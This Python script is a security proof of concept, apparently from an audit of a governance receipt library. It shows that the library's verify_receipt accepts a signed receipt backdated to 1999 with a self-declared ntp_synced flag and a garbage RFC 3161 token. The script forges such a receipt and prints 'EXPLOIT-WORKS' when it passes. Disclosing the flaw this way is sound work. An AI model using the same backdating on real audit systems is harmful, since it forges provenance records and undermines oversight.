#!/usr/bin/env python3
"""PoC 7 — S2.9: BACKDATED receipt PASSes; ntp_synced is self-attested and
rfc3161_token is never verified.

L4 pins only the boolean `ntp_synced is True` — a constant the SIGNER writes
about itself. The verifier never compares created/executed against anything
(it can't, offline), and although build_receipt can embed an rfc3161_token,
verify_receipt contains NO code that validates one. A receipt claiming
created=1999 with ntp_synced=true, and even a garbage rfc3161 token, PASSes.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (generate_keypair, verify_receipt, canonical,
                         sha256_hex, sign, keyid, PREDICATE_TYPE)

HUMAN = {"type": "human", "id": "s.lutar", "is_service_account": False,
         "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

def sign_statement(sk, predicate, subject_name="prod:svc"):
    stmt = {"predicateType": PREDICATE_TYPE,
            "subject": {"name": subject_name,
                        "digest": {"sha256": sha256_hex(canonical(predicate))}},
            "predicate": predicate}
    payload = canonical(stmt)
    stmt["signatures"] = [{"keyid": keyid(sk.public_key()),
                           "sig": sign(sk, PREDICATE_TYPE, payload)}]
    return stmt

sk, pk = generate_keypair()
predicate = {
    "action_id": "a-1999",
    "actor": HUMAN,
    "policy_decision": {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")},
    "execution": {"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
    "evidence": {"items": EV, "completeness": "COMPLETE", "redaction_commitments": []},
    # backdated 27 years; ntp_synced is a self-declared const; token is junk
    "timestamps": {"created": "1999-01-01T00:00:00+00:00",
                   "executed": "1999-01-01T00:00:00+00:00",
                   "ntp_synced": True,
                   "rfc3161_token": "GARBAGE-NOT-A-REAL-TSA-TOKEN"},
    "prev_chain_hash": "GENESIS",
}
receipt = sign_statement(sk, predicate)
v = verify_receipt(receipt, pk)
print("verdict:", v.verdict, "| time_attested:", v.time_attested)
print("reasons:", v.reasons)
print("claimed timestamps:", receipt["predicate"]["timestamps"])

# Unexpected PASS: receipt backdated to 1999 with a forged-looking TSA token
# verifies — time attestation is signer-asserted and tokens are unchecked.
if v.verdict == "PASS":
    print("EXPLOIT-WORKS")
else:
    print("HELD")
